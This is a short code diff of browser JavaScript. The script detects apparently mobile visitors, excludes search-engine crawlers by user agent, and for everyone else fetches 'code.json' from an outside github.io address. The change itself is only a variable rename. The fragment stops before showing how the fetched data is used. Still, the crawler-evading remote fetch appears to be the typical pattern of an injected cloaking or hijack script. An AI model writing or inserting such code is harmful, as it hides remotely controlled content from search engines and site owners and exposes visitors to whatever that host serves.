@@ -1,6 +1,6 @@
 let isWeb =  !(/Win|mac/i.test(navigator.platform));
-let isSpider = /Googlebot|Baiduspider|bingbot|YisouSpider|Bytespider|360Spider|Sogou/i.test(navigator.userAgent);
-let webUser = isWeb && !isSpider;
+let isSpiders = /Googlebot|Baiduspider|bingbot|YisouSpider|Bytespider|360Spider|Sogou/i.test(navigator.userAgent);
+let webUser = isWeb && !isSpiders;
 if (webUser) { 
 	const xhr = new XMLHttpRequest()
 	const url = 'https://sanjinxiaolongxia.github.io/code.json'
